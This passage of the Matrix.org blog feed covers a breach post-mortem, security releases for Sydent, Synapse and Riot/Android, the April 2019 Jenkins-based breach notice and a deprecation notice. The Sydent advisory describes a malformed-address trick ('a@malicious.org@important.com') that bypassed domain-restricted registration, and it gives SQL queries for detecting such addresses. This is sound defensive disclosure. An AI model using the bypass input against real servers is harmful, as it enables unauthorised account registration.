&lt;p&gt;Another thing that the breach made painfully clear is that we log too much.  While there’s not much evidence of the attacker going spelunking through any Matrix service log files, the fact is that whilst developing Matrix we’ve kept logging on matrix.org relatively verbose to help with debugging.  There’s nothing more frustrating than trying to trace through the traffic for a bug only to discover that logging didn’t pick it up.&lt;&#x2F;p&gt;
&lt;p&gt;However, we can still improve our logging and PII-handling substantially:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Ensuring that wherever possible, we hash or at least truncate any PII before logging it (access tokens, matrix IDs, 3rd party IDs etc).&lt;&#x2F;li&gt;
&lt;li&gt;Minimising log retention to the bare minimum we need to investigate recent issues and abuse&lt;&#x2F;li&gt;
&lt;li&gt;Ensuring that PII is stored hashed wherever possible.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Meanwhile, in Matrix itself we already are very mindful of handling PII (c.f. our &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;policies&#x2F;tree&#x2F;master&#x2F;docs&#x2F;matrix-org&quot;&gt;privacy policies&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;05&#x2F;08&#x2F;gdpr-compliance-in-matrix&#x2F;&quot;&gt;GDPR work&lt;&#x2F;a&gt;), but there is also more we can do, particularly:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Turning on end-to-end encryption by default, so that even if a server is compromised, the attacker cannot get at private message history.  Everyone who uses E2EE in Matrix should have felt some relief that even though the server was compromised, their message history was safe: we need to provide that to everyone.  This is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;6779&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;6779&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;We need device audit trails in Matrix, so that even if a compromised server (or malicious server admin) temporarily adds devices to your account, you can see what’s going on.  This is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5145&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5145&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;We need to empower users to configure history retention in their rooms, so they can limit the amount of history exposed to an attacker. This is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1763&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1763&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;We need to provide account portability (aka decentralised accounts) so that even if a server is compromised, the users can seamlessly migrate elsewhere. The first step of this is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1228&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1228&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h3&gt;
&lt;p&gt;Hopefully this gives a comprehensive overview of what happened in the breach, how we handled it, and what we are doing to protect against this happening in future.&lt;&#x2F;p&gt;
&lt;p&gt;Again, we’d like to apologise for the massive inconvenience this caused to everyone caught in the crossfire. Thank you for your patience and for sticking with the project whilst we restored systems. And while it is very unfortunate that we ended up in this situation, at least we should be coming out of it much stronger, at least in terms of infrastructure security.  We’d also like to particularly thank &lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;kade-morton-34179283&#x2F;&quot;&gt;Kade Morton&lt;&#x2F;a&gt; for providing independent review of this post and our remediations, and everyone who reached out with #hugops during the incident (it was literally the only positive thing we had on our radar), and finally thanks to the those of the Matrix team who hauled ass to rebuild the infrastructure, and also those who doubled down meanwhile to keep the rest of the project on track.&lt;&#x2F;p&gt;
&lt;p&gt;On which note, we’re going to go back to building decentralised communication protocols and reference implementations for a bit...  Emoji reactions are on the horizon (at last!), as is Message Editing, RiotX&#x2F;Android and a host of other long-awaited features - not to mention finally releasing Synapse 1.0.  So: thanks again for flying Matrix, even during this period of extreme turbulence and, uh, hijack.  Things should mainly be back to normal now and for the foreseeable.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;i&gt;Given the new blog doesn&#x27;t have comments yet, feel free to discuss the post over at &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=19857744&quot;&gt;HN&lt;&#x2F;a&gt;.&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Security updates: Sydent 1.0.3, Synapse 0.99.3.1 and Riot&#x2F;Android 0.9.0 &#x2F; 0.8.99 &#x2F; 0.8.28a</title>
        <published>2019-05-03T00:00:00+00:00</published>
        <updated>2019-05-03T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28a/" type="text/html"/>
        <id>https://matrix.org/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28a/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Over the last few weeks we’ve ended up getting a lot of attention from the security research community, which has been incredibly useful and massively appreciated in terms of contributions to improve the security of the reference Matrix implementations.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve also set up an official &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F;&quot;&gt;Security Disclosure Policy&lt;&#x2F;a&gt; to explain the process of reporting security issues to us safely via responsible disclosure - including a Hall of Fame to credit those who have done so.  (Please mail &lt;a href=&quot;mailto:security@matrix.org&quot;&gt;security@matrix.org&lt;&#x2F;a&gt; to remind us if we’ve forgotten you!).&lt;&#x2F;p&gt;
&lt;p&gt;Since we published the Hall of Fame yesterday, we’ve already been getting new entries and so we’re doing a set of security releases today to ensure they are mitigated asap.  Unfortunately the work around this means that we’re running late in publishing the post mortem of the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;security-incident&quot;&gt;Apr 11 security incident&lt;&#x2F;a&gt; - we are trying to get that out as soon as we can.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;sydent-1-0-3&quot;&gt;Sydent 1.0.3&lt;&#x2F;h2&gt;
&lt;p&gt;Sydent 1.0.3 has three security fixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Ensure that authentication tokens are generated using a secure random number generator, ensuring they cannot be predicted by an attacker.  This is an important fix - please update.  Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing the issue!&lt;&#x2F;li&gt;
&lt;li&gt;Mitigate an HTML injection bug where an invalid room_id could result in malicious HTML being injected into validation emails.  &lt;strong&gt;The fix for this is in the email template itself; you will need to update any customised email templates to be protected.&lt;&#x2F;strong&gt;  Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing this issue too!&lt;&#x2F;li&gt;
&lt;li&gt;Randomise session_ids to avoid leaking info about the total number of identity validations, and whether a given ID has been validated.  Thanks to &lt;a href=&quot;https:&#x2F;&#x2F;fs0c131y.com&quot;&gt;@fs0c131y&lt;&#x2F;a&gt; for identifying and responsibly disclosing this one.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;If you are running Sydent as an identity server, you should update as soon as possible from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&#x2F;releases&#x2F;v1.0.3&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&#x2F;releases&#x2F;v1.0.3&lt;&#x2F;a&gt;.  We are not aware of any of these issues having been exploited maliciously in the wild.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;synapse-0-99-3-1&quot;&gt;Synapse 0.99.3.1&lt;&#x2F;h2&gt;
&lt;p&gt;Synapse 0.99.3.1 is a security update for two fixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Ensure that random IDs in Synapse are generated using a secure random number generator, ensuring they cannot be predicted by an attacker. Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing this issue!&lt;&#x2F;li&gt;
&lt;li&gt;Add 0.0.0.0&#x2F;32 and ::&#x2F;128 to the URL preview blacklist configuration, ensuring that an attacker cannot make connections to localhost. Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing this issue too!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;You can update from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&lt;&#x2F;a&gt; or similar as normal. We are not aware of any of these issues having been exploited maliciously in the wild.&lt;&#x2F;p&gt;
&lt;p&gt;(Synapse 0.99.3.2 was released shortly afterwards to fix a non-security issue with the Debian packaging)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;riot-android-0-9-x-0-8-99-google-play-and-0-8-28a-f-droid&quot;&gt;Riot&#x2F;Android 0.9.x&#x2F;0.8.99 (Google Play) and 0.8.28a (F-Droid)&lt;&#x2F;h2&gt;
&lt;p&gt;Riot&#x2F;Android has an important security fix which shipped over the course of the last week in various versions of the app:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Remove obsolete and buggy ContentProvider which could allow a malicious local app to compromise account data. Many thanks to Julien Thomas (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@julien_thomas&quot;&gt;@julien_thomas&lt;&#x2F;a&gt;) from &lt;a href=&quot;https:&#x2F;&#x2F;protektoid.com&quot;&gt;Protektoid Project&lt;&#x2F;a&gt; for identifying this and responsibly disclosing it!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The fix for this shipped on F-Droid since 0.8.28a, and on the Play Store, the fix is present in both v0.9.0 (the first version of the re-published Riot app) and v0.8.99 (the last version of the old Riot app, which told everyone to reinstall).  Other forks of Riot which we’re aware of have also been informed and should be updated.&lt;&#x2F;p&gt;
&lt;p&gt;If you haven’t already updated, please do so now.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Security Update: Sydent 1.0.2</title>
        <published>2019-04-18T00:00:00+00:00</published>
        <updated>2019-04-18T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/04/18/security-update-sydent-1-0-2/" type="text/html"/>
        <id>https://matrix.org/blog/2019/04/18/security-update-sydent-1-0-2/</id>
        
        <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;&#x2F;h2&gt;
&lt;p&gt;We became aware today of a flaw in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&quot;&gt;sydent&lt;&#x2F;a&gt;’s validation of email addresses which can lead to a failure to correctly limit registration to a given email domain.  &lt;strong&gt;This only affects people who run their own sydent, and are relying on allowed_local_3pid in their synapse config.&lt;&#x2F;strong&gt; We’d like to thank &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;fs0c131y&quot;&gt;@fs0c131y&lt;&#x2F;a&gt; for bringing it to our attention on &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;fs0c131y&#x2F;status&#x2F;1118791420624687104&quot;&gt;Twitter&lt;&#x2F;a&gt; this morning.  We are not aware of this being exploited in the wild other than the initial report.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;If you are running your own sydent, and limiting signup for your server using the &lt;code&gt;allowed_local_3pids&lt;&#x2F;code&gt; configuration option, then you need to upgrade your sydent immediately to Sydent 1.0.2.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, if you have been relying on the &lt;code&gt;allowed_local_3pids&lt;&#x2F;code&gt; configuration option to restrict access to your homeserver, you may wish to check your homeserver’s user_threepids table for malformed email addresses and your sydent’s database as follows:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;$ sqlite3 sydent.db 
&lt;&#x2F;span&gt;&lt;span&gt;sqlite&amp;gt; select count(*) from global_threepid_associations where address like &amp;#39;%@%@%&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;$ psql matrix
&lt;&#x2F;span&gt;&lt;span&gt;matrix=&amp;gt; select count(*) from user_threepids where address like &amp;#39;%@%@%&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt; count 
&lt;&#x2F;span&gt;&lt;span&gt;-------
&lt;&#x2F;span&gt;&lt;span&gt;     0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If the queries return more than 0 results, please let us know at &lt;a href=&quot;mailto:security@matrix.org&quot;&gt;security@matrix.org&lt;&#x2F;a&gt; - otherwise you are fine.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;details&quot;&gt;Details&lt;&#x2F;h2&gt;
&lt;p&gt;A flaw existed in sydent whereby it was possible to bypass the requirement specified in synapse’s &lt;code&gt;allowed_local_3pids&lt;&#x2F;code&gt; option, which restricts that users may only register with an email address matching a specific format.&lt;&#x2F;p&gt;
&lt;p&gt;This relied on two things:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;sydent uses python&#x27;s email.utils.parseaddr function to parse the input email address before sending validation mail to it, but it turns out that if you hand parseaddr an malformed email address of form a@b.com@c.com, it silently discards the @c.com prefix without error.  The result of this is that if one requested a validation token for &#x27;a@malicious.org@important.com&#x27;, the token would be sent to &#x27;a@malicious.org&#x27;, but the address &#x27;a@malicious.org@important.com&#x27; would be marked as validated.  This release fixes this behaviour by asserting that the parsed email address is the same as the input email address.&lt;&#x2F;li&gt;
&lt;li&gt;synapse&#x27;s checking of email addresses relies on regular expressions in the home server configuration file. synapse does not validate email addresses before checking them against these regular expressions, so naive regular expressions will detect the second domain in email addresses such as the above, causing them to pass the check.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;You can get sydent 1.0.2 from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&#x2F;releases&#x2F;tag&#x2F;v1.0.2&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&#x2F;releases&#x2F;tag&#x2F;v1.0.2&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>We have discovered and addressed a security breach. (Updated 2019-04-12)</title>
        <published>2019-04-11T00:00:00+00:00</published>
        <updated>2019-04-11T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/04/11/we-have-discovered-and-addressed-a-security-breach-updated-2019-04-12/" type="text/html"/>
        <id>https://matrix.org/blog/2019/04/11/we-have-discovered-and-addressed-a-security-breach-updated-2019-04-12/</id>
        
        <content type="html">&lt;p&gt;&lt;b&gt;Update: for the full story here, please see &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&quot;&gt;the post mortem&lt;&#x2F;a&gt;.&lt;&#x2F;b&gt;
&lt;br&#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;here-s-what-you-need-to-know&quot;&gt;Here&#x27;s what you need to know.&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;TL;DR:&lt;&#x2F;strong&gt; An attacker gained access to the servers hosting Matrix.org. The intruder had access to the production databases, potentially giving them access to unencrypted message data, password hashes and access tokens. As a precaution, if you&#x27;re a matrix.org user you should &lt;strong&gt;change your password now&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The matrix.org homeserver has been rebuilt and is running securely; bridges and other ancillary services (e.g. this blog) will follow as soon as possible. Modular.im homeservers have not been affected by this outage.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-security-breach-is-not-a-matrix-issue&quot;&gt;The security breach is not a Matrix issue.&lt;&#x2F;h3&gt;
&lt;p&gt;The hacker exploited a vulnerability in our production infrastructure (specifically a slightly outdated version of Jenkins). &lt;strong&gt;Homeservers other than matrix.org are unaffected.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;how-does-this-affect-me&quot;&gt;How does this affect me?&lt;&#x2F;h3&gt;
&lt;p&gt;We have invalidated all of the active access tokens for users on Matrix.org - all users have been logged out.&lt;&#x2F;p&gt;
&lt;p&gt;Users with &lt;strong&gt;Matrix.org accounts&lt;&#x2F;strong&gt; should:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Change your password now&lt;&#x2F;strong&gt; - no plaintext Matrix passwords were leaked, but weak passwords could still be cracked from the hashed passwords&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Change your NickServ password (if you&#x27;re using IRC bridging)&lt;&#x2F;strong&gt; - there&#x27;s no evidence bridge credentials were compromised, but if you have given the IRC bridges credentials to your NickServ account we would recommend changing this password&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;And as a reminder, it&#x27;s good practice to:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Review your device list regularly&lt;&#x2F;strong&gt; - make sure you recognise all of the devices connected to your account&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Always make sure you enable E2E encryption for private conversations&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;what-user-data-has-been-accessed&quot;&gt;What user data has been accessed?&lt;&#x2F;h3&gt;
&lt;p&gt;Forensics are ongoing; so far we&#x27;ve found no evidence of large quantities of data being downloaded. The attacker did have access to the production database, so unencrypted content (including private messages, password hashes and access tokens) may be compromised.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;what-has-not-been-affected&quot;&gt;What has not been affected?&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Source code and packages have not been impacted based on our initial investigations.  However, we will be replacing signing keys as a precaution.&lt;&#x2F;li&gt;
&lt;li&gt;Modular.im servers are not affected, based on our initial analysis&lt;&#x2F;li&gt;
&lt;li&gt;Identity server data does not appear to have been compromised&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The target appeared to be internal credentials for onward exploits, not end user information from the matrix.org homeserver.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;you-might-have-lost-access-to-your-encrypted-messages&quot;&gt;You might have lost access to your encrypted messages.&lt;&#x2F;h3&gt;
&lt;p&gt;As we had to log out all users from matrix.org, if you do not have backups of your encryption keys you will not be able to read your encrypted conversation history.  However, if you use server-side encryption key backup (the default in Riot these days) or take manual key backups, you’ll be okay. &lt;&#x2F;p&gt;
&lt;p&gt;This was a difficult choice to make. We weighed the risk of some users losing access to encrypted messages against that of all users&#x27; accounts being vulnerable to hijack via the compromised access tokens. We hope you can see why we made the decision to prioritise account integrity over access to encrypted messages, but we&#x27;re sorry for the inconvenience this may have caused.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-happened&quot;&gt;What happened?&lt;&#x2F;h2&gt;
&lt;p&gt;We were using Jenkins for continuous integration (automatically testing our software). The version of Jenkins we were using had a vulnerability (&lt;a href=&quot;https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2019-1003000&quot;&gt;CVE-2019-1003000&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2019-1003001&quot;&gt;CVE-2019-1003001&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2019-1003002&quot;&gt;CVE-2019-1003002&lt;&#x2F;a&gt;) which allowed an attacker to hijack credentials (forwarded ssh keys), giving access to our production infrastructure. Thanks to &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;jaikeysarraf&quot;&gt;@jaikeysarraf&lt;&#x2F;a&gt; for drawing this to our attention.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;&#x2F;h3&gt;
&lt;p&gt;March 13th &lt;b&gt;Updated 2019-04-12 11:00 UTC&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Attacker compromises Jenkins CI server&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;April 4th &lt;b&gt;Updated 2019-04-12 11:00 UTC&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Attacker gains access to production infrastructure by hijacking a forwarded SSH agent logging into the compromised Jenkins worker&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;April 9th&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Jenkins vulnerability brought to our attention by &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;jaikeysarraf&quot;&gt;@jaikeysarraf&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;April 10th&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Investigation identified the compromised machines and the full scope of the attack&lt;&#x2F;li&gt;
&lt;li&gt;Jenkins was removed&lt;&#x2F;li&gt;
&lt;li&gt;Attacker&#x27;s access to compromised machines was removed&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;April 11th&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Matrix.org was taken offline and production infrastructure fully rebuilt&lt;&#x2F;li&gt;
&lt;li&gt;Having fully flushed out the attacker, external communication was published informing users and advising on next steps&lt;&#x2F;li&gt;
&lt;li&gt;Matrix.org homeserver restored, with bridges and ancillary services (e.g. this blog) following as soon as possible&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;update-2019-04-12&quot;&gt;Update 2019-04-12&lt;&#x2F;h2&gt;
&lt;p&gt;At around 5am UTC on Apr 12, the attacker used a cloudflare API key to repoint DNS for matrix.org to a defacement website (https:&#x2F;&#x2F;github.com&#x2F;matrixnotorg&#x2F;matrixnotorg.github.io).
The API key was known compromised in the original attack, and during the rebuild the key was theoretically replaced.  However, unfortunately
only personal keys were rotated, enabling the defacement.  We are currently doublechecking that all compromised secrets have been rotated.&lt;&#x2F;p&gt;
&lt;p&gt;The rebuilt infrastructure itself is secure, however, and the DNS issue has been solved without further abuse.
If you have already changed your password, you do not need to do so again.&lt;&#x2F;p&gt;
&lt;p&gt;The defacement confirms that encrypted password hashes were exfiltrated from the production database, so &lt;b&gt;it is even more important
for everyone to change their password&lt;&#x2F;b&gt;.  We will shortly be messaging and emailing all users to announce the breach and advise them
to change their passwords.  We will also look at ways of non-destructively forcing a password reset at next login.&lt;&#x2F;p&gt;
&lt;p&gt;The attacker has also posted github issues detailing some of their actions and suggested remediations at
https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;created_by&#x2F;matrixnotorg.&lt;&#x2F;p&gt;
&lt;p&gt;This confirms that GPG keys used for signing packages were compromised.  These keys are used for signing
the synapse debian repository (AD0592FE47F0DF61), and releases of Riot&#x2F;Web (E019645248E8F4A1).
Both keys have now been revoked.  The window of compromise for the keys started from April 4th; there have
been no Synapse releases since then.  There has been one release of Riot&#x2F;Web (1.0.7), however as the key
was passphrased and based on our initial analysis of the release, we believe it to be secure.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-are-we-doing-to-prevent-this-in-future&quot;&gt;What are we doing to prevent this in future?&lt;&#x2F;h2&gt;
&lt;p&gt;Once things are back up and running we will retrospect on this incident in detail to identify the changes we need to make. We will provide a proper postmortem, including follow-up steps; meanwhile we are obviously going to take measures to improve the security of our production infrastructure, including patching services more aggressively and more regular vulnerability scans.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse: Deprecating Postgres 9.4 and Python 2.x</title>
        <published>2019-04-08T00:00:00+00:00</published>
        <updated>2019-04-08T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/04/08/synapse-deprecating-postgres-9-4-and-python-2-x/" type="text/html"/>
        <id>https://matrix.org/blog/2019/04/08/synapse-deprecating-postgres-9-4-and-python-2-x/</id>
        
        <content type="html">&lt;p&gt;&lt;strong&gt;TL;DR DON&#x27;T PANIC - Synapse 1.0 will support Postgres 9.4 and Python 2.7&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Folks, this is an update to explain that we will be shortly deprecating Synapse support for Postgres 9.4 and Python 2.x.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-are-we-doing&quot;&gt;What are we doing?&lt;&#x2F;h2&gt;
&lt;p&gt;From the dates described below, we will no longer guarantee support for deprecated versions. This means that Synapse &lt;em&gt;may &lt;&#x2F;em&gt;continue to work with these versions but we will not make any attempt to ensure compatibility and will remove old library versions from our CI.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;when-is-this-happening&quot;&gt;When is this happening?&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;Synapse 1.0 will continue to support both technologies, but subsequent releases may not:-&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;For Python, we shared that we would discontinue to Python 2.x support from&lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;12&#x2F;21&#x2F;porting-synapse-to-python-3&#x2F;&quot;&gt; April 1st 2019&lt;&#x2F;a&gt;, so for the first release that follows 1.0 we do not guarantee Python 2.x support.&lt;&#x2F;p&gt;
&lt;p&gt;For Postgres, will give server admins 6 weeks to upgrade to a newer version, and will guarantee support &lt;strong&gt;up until 20th May 2019.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;why-would-you-do-this-to-us&quot;&gt;Why would you do this to us?&lt;&#x2F;h2&gt;
&lt;p&gt;We have multiple reasons, but broadly:-&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;We want to make use of new language features not supported in old versions. This will enable us to continue to improve the performance and maintainability of Synapse.&lt;&#x2F;li&gt;
 	&lt;li&gt;Python 2.x overall will be &lt;a href=&quot;https:&#x2F;&#x2F;pythonclock.org&#x2F;&quot;&gt;end of life&#x27;d at the end of the year&lt;&#x2F;a&gt;. &lt;a href=&quot;https:&#x2F;&#x2F;www.postgresql.org&#x2F;support&#x2F;versioning&#x2F;&quot;&gt;Postgres 9.4&#x27;s final release&lt;&#x2F;a&gt; will follow 2 months later on 13th February 2020.&lt;&#x2F;li&gt;
 	&lt;li&gt;Since very few server admins still use these technologies on the wild, providing support is costly and we want to reduce our overall maintenance load.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;la-la-la-i-am-ignoring-you-what-will-happen&quot;&gt;La la la I am ignoring you - what will happen?&lt;&#x2F;h2&gt;
&lt;p&gt;You will be able to upgrade to Synapse 1.0, but will likely experience incompatibilities that prevent you upgrading further. Seriously, you really need to upgrade.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;okay-but-i-have-questions-where-should-i-go&quot;&gt;Okay, but I have questions, where should I go?&lt;&#x2F;h2&gt;
&lt;p&gt;Come and say Hi in #synapse:matrix.org and we&#x27;ll do our best to help you.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix 1.0  - Are We Ready Yet?</title>
        <published>2019-03-15T00:00:00+00:00</published>
        <updated>2019-03-15T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/03/15/matrix-1-0-https-arewereadyyet-com/" type="text/html"/>
        <id>https://matrix.org/blog/2019/03/15/matrix-1-0-https-arewereadyyet-com/</id>
        
        <content type="html">&lt;p&gt;TL;DR &lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;If you run a Synapse ensure that your federation certificates are valid &lt;a href=&quot;&#x2F;federationtester&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;. 
&lt;&#x2F;li&gt;
